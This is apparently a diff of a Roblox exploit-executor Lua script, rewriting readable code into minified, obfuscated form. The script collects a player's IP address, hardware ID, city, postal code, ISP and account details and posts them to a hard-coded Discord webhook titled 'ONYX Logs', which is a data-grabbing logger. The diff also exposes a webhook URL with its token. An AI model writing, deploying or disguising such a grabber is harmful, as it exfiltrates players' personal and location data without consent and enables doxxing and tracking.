-                    "**IP:** `%s`\n**HWID:** `%s`\n**Country:** %s :flag_%s:\n**Region:** %s\n**City:** %s\n**Postal Code:** %s\n**ISP:** %s\n**Organization:** %s\n**Time Zone:** %s",
-                    GetIp, Hwid, GetData.country, string.lower(GetData.countryCode), GetData.regionName, GetData.city, GetData.zip, GetData.isp, GetData.org, GetData.timezone
-                ),
-                color = tonumber("0xe74c3c")
-            },
-            {
-                title = "⚙️ Technical Details",
-                description = string.format(
-                    "**Executor:** `%s`\n**Job ID:** [Click to Copy](%s)\n**Mobile Join:** [Click](%s)",
-                    executor, jobIdLink, mobileJoinLink
-                ),
-                color = tonumber("0x95a5a6"),
-                footer = { 
-                    text = string.format("📅 Date: %s | ⏰ Time: %s", date, time)
-                }
-            }
-        }
-    }
-    return HttpService:JSONEncode(data)
+local U={
+username="ONYX Logs",
+avatar_url="https://i.imgur.com/AfFp7pu.png",
+embeds={
+{
+title="🎮 Game Information",
+description=string.format("**[%s](%s)**\n`ID: %d`",K,Q,game.PlaceId),
+color=tonumber"0x2ecc71"
+},
+{
+title="👤 Player Information",
+description=string.format(
+"**Display Name:** [%s](%s)\n**Username:** %s\n**User ID:** %d\n**Membership:** %s\n**Account Age:** %d days\n**Platform:** %s\n**Ping:** %dms",
+B,R,C,A,D,E,L,M
+),
+color=D=="Premium"and tonumber"0xf1c40f"or tonumber"0x3498db"
+},
+{
+title="🌐 Location & Network",
+description=string.format(
+"**IP:** `%s`\n**HWID:** `%s`\n**Country:** %s :flag_%s:\n**Region:** %s\n**City:** %s\n**Postal Code:** %s\n**ISP:** %s\n**Organization:** %s\n**Time Zone:** %s",
+G,I,H.country,string.lower(H.countryCode),H.regionName,H.city,H.zip,H.isp,H.org,H.timezone
+),
+color=tonumber"0xe74c3c"
+},
+{
+title="⚙️ Technical Details",
+description=string.format(
+"**Executor:** `%s`\n**Job ID:** [Click to Copy](%s)\n**Mobile Join:** [Click](%s)",
+N,T,S
+),
+color=tonumber"0x95a5a6",
+footer={
+text=string.format("📅 Date: %s | ⏰ Time: %s",O,P)
+}
+}
+}
+}
+return s:JSONEncode(U)
 end
 
-local function sendWebhook(webhookUrl, data)
-    local headers = {["Content-Type"] = "application/json"}
-    local request = http_request or request or HttpPost or syn.request
-    local webhookRequest = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
-    request(webhookRequest)
+local function sendWebhook(N,O)
+local P={["Content-Type"]="application/json"}
+local Q=http_request or request or HttpPost or syn.request
+local R={Url=N,Body=O,Method="POST",Headers=P}
+Q(R)
 end
 
-local webhookUrl = "https://discord.com/api/webhooks/1344488660229160980/ERQLy9igVfqZJJcvhXBA4DQjOYavOCto6U_EqDSFJ6Sxej1YMlSau7yJ4ykn7WbMicnR"
-local webhookData = createWebhookData()
-sendWebhook(webhookUrl, webhookData)
-
+local N="https://discord.com/api/webhooks/1344488660229160980/ERQLy9igVfqZJJcvhXBA4DQjOYavOCto6U_EqDSFJ6Sxej1YMlSau7yJ4ykn7WbMicnR"
+local O=createWebhookData()
+sendWebhook(N,O)
